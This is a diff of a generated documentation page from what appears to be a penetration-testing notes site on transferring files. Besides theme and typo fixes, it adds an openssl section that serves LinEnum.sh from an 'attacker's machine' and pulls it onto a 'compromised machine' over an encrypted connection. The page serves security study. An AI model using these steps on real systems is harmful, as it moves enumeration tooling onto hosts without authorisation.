@@ -22,7 +22,7 @@
       
       
       <link rel="icon" href="../img/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.39">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.40">
     
     
       
@@ -6399,6 +6399,15 @@
   <a href="#uploadserver" class="md-nav__link">
     <span class="md-ellipsis">
       uploadserver
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#openssl" class="md-nav__link">
+    <span class="md-ellipsis">
+      openssl
     </span>
   </a>
   
@@ -16108,6 +16117,15 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#openssl" class="md-nav__link">
+    <span class="md-ellipsis">
+      openssl
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -16192,6 +16210,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>In Apache, the PHP module loves to execute anything ending in PHP. Also, by default, with Apache, if we hit a directory without an index file (index.html), it will list all the files.</p>
 <h2 id="nginx">Nginx</h2>
 <p>In Apache, the PHP module loves to execute anything ending in PHP. This is not very safe when allowing <code>HTTP</code> uploads, as we are trying to avoid that users cannot upload web shells and execute them.</p>
+<p>Nginx server: </p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Create a Directory to Handle Uploaded Files</span>
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>sudo<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>/var/www/uploads/SecretUploadDirectory
 </span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
@@ -16224,7 +16243,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="c1"># and we might check that port 80 could not be binded because is already in use</span>
 </span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
 </span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="c1"># See which service is using port 80</span>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>ss<span class="w"> </span>-lnpt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="sb">`</span><span class="m">80</span><span class="sb">`</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>ss<span class="w"> </span>-lnpt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">80</span>
 </span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c1"># we will obtain the service and also the pid. For instance `2811`</span>
 </span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>
 </span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="c1"># Check pid, for instance pid 2811, and see who is running it</span>
@@ -16233,7 +16252,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="c1"># Remove NginxDefault Configuration to get around this, we can remove the default Nginx configuration, which binds on port 80.</span>
 </span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>sudo<span class="w"> </span>rm<span class="w"> </span>/etc/nginx/sites-enabled/default
 </span></code></pre></div>
-<p>Finally you can copy to your nging server all files you want to transfer with curl:</p>
+<p>Finally you can copy to your nginx server all files you want to transfer with curl:</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>curl<span class="w"> </span>-T<span class="w"> </span>file.txt
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1"># -T, --upload-file &lt;file&gt;; This transfers the specified local file to the remote URL. -T uses PUT http method</span>
 </span></code></pre></div>
@@ -16263,10 +16282,20 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>Basic usage:</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>uploadserver
 </span></code></pre></div>
+<h2 id="openssl">openssl</h2>
+<p>Create a certificate in the attacker's machine:</p>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="go">openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem</span>
+</span></code></pre></div>
+<p>Launch the openssl server in the attacker's machine:</p>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="go">openssl s_server -quiet -accept $portAttacker -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh</span>
+</span></code></pre></div>
+<p>Next, with the server running, we need to download the file from the compromised machine. So, download the file from the victim's machine:</p>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="go">openssl s_client -connect $ipAttacker:$portAttacker -quiet &gt; LinEnum.sh</span>
+</span></code></pre></div>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-10-06T19:24:59+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-10-06</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-10-13T19:34:04+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-10-13</span></small></br>
 
 
     <small>Created: July 15, 2023 17:03:48</small>
